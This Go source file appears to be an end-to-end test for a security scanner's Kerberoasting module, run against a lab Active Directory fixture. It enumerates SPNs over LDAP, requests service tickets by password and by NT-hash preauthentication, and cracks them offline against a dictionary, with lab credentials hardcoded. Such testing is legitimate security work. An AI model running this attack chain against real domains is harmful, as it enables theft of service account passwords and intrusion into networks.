// Command kerberoast-e2e 对真实 AD 域控跑 Kerberoasting 全链路验收：
// LDAP 枚举 SPN → 申请 TGS（明文 + NT hash 两条预认证路径）→ RC4-HMAC
// 离线字典破解。退出码 0 = 全链路 PASS。只在测试域（如 r5-samba-dc 夹具）
// 上运行。
package main

import (
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/Autumn-27/jingwei/scanner"
	"github.com/Autumn-27/jingwei/scanner/krbcrypt"
)

func main() {
	ldap := flag.String("ldap", "ldap://172.23.0.7:389", "域控 LDAP 端点")
	user := flag.String("user", "svc-sql", "LDAP bind 账号（域用户）")
	pass := flag.String("pass", "SvcPass123!", "bind 口令")
	spn := flag.String("spn", "MSSQLSvc/dc1.jwlab.local:1433", "目标 SPN")
	flag.Parse()

	fmt.Println("== Kerberoasting E2E ==")
	fmt.Printf("ldap=%s user=%s spn=%s\n", *ldap, *user, *spn)
	fail := false

	k := scanner.NewRealKerberoaster()
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	// 1) LDAP 枚举 SPN
	fmt.Println("-- [1] DomainSPNs (LDAP)")
	spns, err := k.DomainSPNs(ctx, *ldap, *user, *pass)
	if err != nil {
		fmt.Println("   FAIL:", err)
		fail = true
	} else {
		fmt.Printf("   命中 %d 条:\n", len(spns))
		for _, r := range spns {
			flag_ := "enabled"
			if !r.Enabled {
				flag_ = "disabled"
			}
			fmt.Printf("   - %s | %s | %s\n", r.User, r.SPN, flag_)
		}
		found := false
		for _, r := range spns {
			if r.User == *user && r.SPN == *spn && r.Enabled {
				found = true
			}
		}
		if !found {
			fmt.Printf("   FAIL: 未见目标 %s|%s\n", *user, *spn)
			fail = true
		} else {
			fmt.Println("   PASS: 目标账号+SPN 在列且启用")
		}
	}

	// 2) GetTGS 明文预认证
	fmt.Println("-- [2] GetTGS (password preauth)")
	tgsHex, err := k.GetTGS(ctx, *user, *pass, *spn, false)
	if err != nil {
		fmt.Println("   FAIL:", err)
		fail = true
	} else {
		fmt.Printf("   ticket enc-part %d bytes (etype23 RC4) head=%s...\n", len(tgsHex)/2, tgsHex[:24])
	}

	// 3) 离线字典破解（字典故意以错口令开头，证明命中来自破解而非预设）
	fmt.Println("-- [3] Offline crack (RC4-HMAC)")
	dict := []string{"WrongPass1!", "JWLAB2023", "Summer2024!", "Tr0ub4dor&3", *pass}
	cracked, ok, err := krbcrypt.CrackKRB5TGS23(tgsHex, dict)
	if err != nil {
		fmt.Println("   FAIL:", err)
		fail = true
	} else if !ok {
		fmt.Println("   FAIL: 字典未命中")
		fail = true
	} else if cracked != *pass {
		fmt.Printf("   FAIL: 破出 %q 不是预期 %q（密钥一致性有问题）\n", cracked, *pass)
		fail = true
	} else {
		fmt.Printf("   PASS: 字典破解命中 %q，NT hash=%s\n", cracked, hex.EncodeToString(krbcrypt.NTLMHash(cracked)))
	}

	// 4) NT hash 预认证路径（手工 keytab）同样拿到可破解票据
	fmt.Println("-- [4] GetTGS (NT-hash keytab preauth)")
	nt := krbcrypt.NTLMHash(cracked)
	tgsHex2, err := k.GetTGS(ctx, *user, hex.EncodeToString(nt), *spn, true)
	if err != nil {
		fmt.Println("   FAIL:", err)
		fail = true
	} else {
		c2, ok2, err2 := krbcrypt.CrackKRB5TGS23(tgsHex2, dict)
		switch {
		case err2 != nil:
			fmt.Println("   FAIL:", err2)
			fail = true
		case !ok2 || c2 != *pass:
			fmt.Printf("   FAIL: hash 路径票据破解未命中（got %q ok %v）\n", c2, ok2)
			fail = true
		default:
			fmt.Println("   PASS: NT hash keytab 预认证 → 票据 → 离线破解同命中")
		}
	}

	fmt.Println("== KERBEROAST_E2E:", verdict(fail), "==")
	if fail {
		os.Exit(1)
	}
}

func verdict(fail bool) string {
	if fail {
		return "FAIL"
	}
	return "PASS"
}
